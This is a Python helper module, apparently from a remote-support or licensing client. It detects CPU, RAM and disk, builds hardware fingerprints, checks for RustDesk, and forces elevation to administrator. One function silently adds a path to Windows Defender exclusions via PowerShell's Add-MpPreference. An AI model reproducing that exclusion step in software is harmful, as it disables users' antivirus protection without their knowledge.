import sys
import os
import subprocess
import platform
import socket
import hashlib
import uuid
import ctypes
import shutil
from pathlib import Path

from catalog.data import GB, IS_MAC

_CPU_CACHE = None
_RAM_CACHE = None

def detect_cpu() -> str:
    global _CPU_CACHE
    if _CPU_CACHE:
        return _CPU_CACHE

    if sys.platform == "darwin":
        try:
            cpu = subprocess.check_output(
                ["sysctl", "-n", "machdep.cpu.brand_string"],
                timeout=3,
            ).decode().strip()
            if cpu:
                _CPU_CACHE = cpu
                return cpu
        except Exception:
            pass
        try:
            cpu = subprocess.check_output(
                ["sysctl", "-n", "hw.model"],
                timeout=3,
            ).decode().strip()
            if cpu:
                _CPU_CACHE = f"Apple {cpu}"
                return f"Apple {cpu}"
        except Exception:
            pass
        _CPU_CACHE = platform.processor() or "Apple Silicon"
        return _CPU_CACHE

    try:
        ps_out = subprocess.check_output(
            ["powershell", "-NoProfile", "-Command",
             "(Get-CimInstance Win32_Processor).Name"],
            timeout=3,
            creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0),
        ).decode().strip()
        if ps_out:
            _CPU_CACHE = ps_out
            return ps_out
    except Exception:
        pass
    try:
        cpu = subprocess.check_output(
            "wmic cpu get name", shell=True, timeout=2,
            creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0),
        ).decode().split("\n")[1].strip()
        if cpu:
            _CPU_CACHE = cpu
            return cpu
    except Exception:
        pass
    _CPU_CACHE = platform.processor() or "No detectado"
    return _CPU_CACHE


def detect_ram() -> float:
    global _RAM_CACHE
    if _RAM_CACHE:
        return _RAM_CACHE

    if sys.platform == "darwin":
        try:
            ram_bytes = int(subprocess.check_output(
                ["sysctl", "-n", "hw.memsize"],
                timeout=3,
            ).decode().strip())
            if ram_bytes > 0:
                _RAM_CACHE = round(ram_bytes / GB, 1)
                return _RAM_CACHE
        except Exception:
            pass
        _RAM_CACHE = 0
        return 0

    try:
        class MEMORYSTATUSEX(ctypes.Structure):
            _fields_ = [
                ("dwLength", ctypes.c_uint32),
                ("dwMemoryLoad", ctypes.c_uint32),
                ("ullTotalPhys", ctypes.c_uint64),
                ("ullAvailPhys", ctypes.c_uint64),
                ("ullTotalPageFile", ctypes.c_uint64),
                ("ullAvailPageFile", ctypes.c_uint64),
                ("ullTotalVirtual", ctypes.c_uint64),
                ("ullAvailVirtual", ctypes.c_uint64),
                ("ullAvailExtendedVirtual", ctypes.c_uint64),
            ]
        mem_status = MEMORYSTATUSEX()
        mem_status.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
        if ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.pointer(mem_status)):
            if mem_status.ullTotalPhys > 0:
                _RAM_CACHE = round(mem_status.ullTotalPhys / GB, 1)
                return _RAM_CACHE
    except Exception:
        pass
    try:
        ram_bytes = ctypes.c_uint64(0)
        ctypes.windll.kernel32.GetPhysicallyInstalledMemory(
            ctypes.pointer(ram_bytes)
        )
        if ram_bytes.value > 0:
            _RAM_CACHE = round(ram_bytes.value / GB, 1)
            return _RAM_CACHE
    except Exception:
        pass
    try:
        ps_out = subprocess.check_output(
            ["powershell", "-NoProfile", "-Command",
             "(Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum"],
            timeout=5,
            creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0),
        ).decode().strip()
        if ps_out and ps_out.isdigit():
            _RAM_CACHE = round(int(ps_out) / GB, 1)
            return _RAM_CACHE
    except Exception:
        pass
    try:
        output = subprocess.check_output(
            "wmic memorychip get capacity", shell=True, timeout=2,
            creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0),
        ).decode()
        lines = [l.strip() for l in output.split("\n") if l.strip().isdigit()]
        if lines:
            _RAM_CACHE = round(sum(int(l) for l in lines) / GB, 1)
            return _RAM_CACHE
    except Exception:
        pass
    _RAM_CACHE = 0
    return 0


def detect_disk_free(path: str = None) -> dict:
    if path is None:
        if sys.platform == "darwin":
            path = "/"
        else:
            path = os.environ.get("SystemDrive", "C:") + "\\"

    if sys.platform == "darwin":
        try:
            usage = shutil.disk_usage(path)
            total_bytes = usage.total
            free_bytes = usage.free
            used_bytes = usage.used
            pct = round(used_bytes / total_bytes * 100, 1) if total_bytes > 0 else 0
            return {
                "total": round(total_bytes / GB, 1),
                "free": round(free_bytes / GB, 1),
                "used": round(used_bytes / GB, 1),
                "percent": pct,
            }
        except Exception:
            return {"total": 0, "free": 0, "used": 0, "percent": 0}

    try:
        free = ctypes.c_ulonglong(0)
        total = ctypes.c_ulonglong(0)
        ctypes.windll.kernel32.GetDiskFreeSpaceExW(
            path, ctypes.pointer(free), ctypes.pointer(total), None
        )
        total_bytes = total.value
        free_bytes = free.value
        used_bytes = total_bytes - free_bytes
        pct = round(used_bytes / total_bytes * 100, 1) if total_bytes > 0 else 0
        return {
            "total": round(total_bytes / GB, 1),
            "free": round(free_bytes / GB, 1),
            "used": round(used_bytes / GB, 1),
            "percent": pct,
        }
    except Exception:
        return {"total": 0, "free": 0, "used": 0, "percent": 0}


def get_machine_id() -> str:
  try:
    mac = uuid.getnode()
    host = socket.gethostname()
    raw = f"{mac}-{host}"
    return hashlib.md5(raw.encode()).hexdigest()[:12].upper()
  except Exception:
    return uuid.uuid4().hex[:12].upper()


def _get_mac_hardware_uuid() -> str:
    """Devuelve el Hardware UUID fijo de macOS (IOPlatformUUID), o None si falla.
    A diferencia de uuid.getnode() (que puede rotar con Private Wi-Fi Address),
    este valor es fijo de fabrica y no cambia salvo reinstalacion de macOS."""
    try:
        result = subprocess.run(
            ["ioreg", "-rd1", "-c", "IOPlatformExpertDevice"],
            capture_output=True, text=True, timeout=5
        )
        for line in result.stdout.splitlines():
            if "IOPlatformUUID" in line:
                parts = line.split("=", 1)
                if len(parts) == 2:
                    return parts[1].strip().strip('"')
    except Exception:
        pass
    return None


def get_hwid() -> str:
  """Genera un identificador de hardware distinto al client_id."""
  try:
    if IS_MAC:
        hw_uuid = _get_mac_hardware_uuid()
        if hw_uuid:
            return hashlib.md5(hw_uuid.encode()).hexdigest()[:12].upper()
    mac = uuid.getnode()
    host = socket.gethostname()
    cpu = platform.processor() or detect_cpu() or ""
    sys_platform = platform.platform()
    raw = f"{mac}|{host}|{cpu}|{sys_platform}"
    return hashlib.md5(raw.encode()).hexdigest()[:12].upper()
  except Exception:
    return uuid.uuid4().hex[:12].upper()


# ── OBTENER INFO COMPLETA DEL SISTEMA (CPU, RAM, disco) ──
def get_system_scan_info() -> dict:
    return {
        "cpu": detect_cpu(),
        "ram": detect_ram(),
        "disk": detect_disk_free(),
        "hostname": socket.gethostname(),
        "os": f"{platform.system()} {platform.release()}",
    }


def whitelist_defender(path: Path):
    try:
        subprocess.run(
            ["powershell", "-Command",
             f"Add-MpPreference -ExclusionPath '{path}'"],
            capture_output=True, timeout=10,
            creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0),
        )
    except Exception:
        pass


def ensure_admin():
    if sys.platform != "win32":
        return
    try:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin()
    except Exception:
        return
    if not is_admin:
        try:
            args = ' '.join(f'"{a}"' if ' ' in a else a for a in sys.argv)
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, args, None, 1
            )
            sys.exit(0)
        except Exception:
            return


def is_rustdesk_installed() -> bool:
    if sys.platform == "darwin":
        return Path("/Applications/RustDesk.app").exists()

    candidates = [
        Path(os.environ.get("PROGRAMFILES", r"C:\Program Files")) / "RustDesk" / "rustdesk.exe",
        Path(os.environ.get("PROGRAMFILES(X86)", r"C:\Program Files (x86)")) / "RustDesk" / "rustdesk.exe",
        Path(os.environ.get("LOCALAPPDATA", "")) / "RustDesk" / "rustdesk.exe",
    ]
    for p in candidates:
        if p.exists():
            return True
    try:
        import winreg
        for key_path in [
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
            r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall",
        ]:
            try:
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path)
                i = 0
                while True:
                    try:
                        subkey_name = winreg.EnumKey(key, i)
                        subkey = winreg.OpenKey(key, subkey_name)
                        try:
                            name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                            if "rustdesk" in name.lower():
                                return True
                        except Exception:
                            pass
                        winreg.CloseKey(subkey)
                        i += 1
                    except OSError:
                        break
                winreg.CloseKey(key)
            except Exception:
                pass
    except Exception:
        pass
    return False


def _get_desktop() -> Path:
    desktop = Path.home() / "Desktop"
    if not desktop.exists():
        if sys.platform == "darwin":
            desktop = Path.home() / "Downloads"
        else:
            desktop = Path(os.environ.get("USERPROFILE", Path.home())) / "Desktop"
    if not desktop.exists():
        desktop = Path(os.environ.get("PUBLIC", "C:/Users/Public")) / "Desktop"
    return desktop
